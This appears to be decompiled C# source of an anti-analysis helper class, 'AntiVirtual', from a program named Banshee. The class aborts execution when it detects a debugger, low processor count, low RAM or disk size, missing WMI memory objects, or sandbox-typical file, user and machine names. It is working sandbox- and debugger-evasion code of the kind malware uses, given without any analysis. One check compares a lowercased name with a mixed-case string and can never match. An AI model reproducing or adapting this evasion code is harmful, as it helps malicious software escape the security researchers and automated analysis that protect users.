﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;

namespace Banshee.Helper
{
	// Token: 0x020000AB RID: 171
	public static class AntiVirtual
	{
		// Token: 0x060001FB RID: 507 RVA: 0x0001121C File Offset: 0x0001121C
		public static void CheckOrExit()
		{
			if (AntiVirtual.ProccessorCheck())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckDebugger())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckMemory())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckDriveSpace())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckUserConditions())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckCache())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckFileName())
			{
				throw new Exception();
			}
			if (AntiVirtual.CheckCim())
			{
				throw new Exception();
			}
		}

		// Token: 0x060001FC RID: 508 RVA: 0x00011291 File Offset: 0x00011291
		public static bool CheckFileName()
		{
			return Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName).ToLower().Contains("sandbox");
		}

		// Token: 0x060001FD RID: 509 RVA: 0x000112B6 File Offset: 0x000112B6
		public static bool ProccessorCheck()
		{
			return Environment.ProcessorCount <= 1;
		}

		// Token: 0x060001FE RID: 510 RVA: 0x000112C3 File Offset: 0x000112C3
		public static bool CheckDebugger()
		{
			return Debugger.IsAttached;
		}

		// Token: 0x060001FF RID: 511 RVA: 0x000112CA File Offset: 0x000112CA
		public static bool CheckDriveSpace()
		{
			return new DriveInfo("C").TotalSize / 1073741824L < 50L;
		}

		// Token: 0x06000200 RID: 512 RVA: 0x000112E7 File Offset: 0x000112E7
		public static bool CheckCache()
		{
			return AntiVirtual.CheckCount("Select * from Win32_CacheMemory");
		}

		// Token: 0x06000201 RID: 513 RVA: 0x000112F3 File Offset: 0x000112F3
		public static bool CheckCim()
		{
			return AntiVirtual.CheckCount("Select * from CIM_Memory");
		}

		// Token: 0x06000202 RID: 514 RVA: 0x000112FF File Offset: 0x000112FF
		public static bool CheckCount(string selector)
		{
			return new ManagementObjectSearcher(selector).Get().Count == 0;
		}

		// Token: 0x06000203 RID: 515 RVA: 0x00011314 File Offset: 0x00011314
		public static bool CheckMemory()
		{
			return Convert.ToDouble(new ManagementObjectSearcher("Select * From Win32_ComputerSystem").Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>()["TotalPhysicalMemory"]) / 1048576.0 < 2048.0;
		}

		// Token: 0x06000204 RID: 516 RVA: 0x00011354 File Offset: 0x00011354
		public static bool CheckUserConditions()
		{
			string a = Environment.UserName.ToLower();
			string text = Environment.MachineName.ToLower();
			return (a == "frank" && text.Contains("desktop")) || a == "WDAGUtilityAccount" || (a == "robert" && text.Contains("22h2"));
		}
	}
}
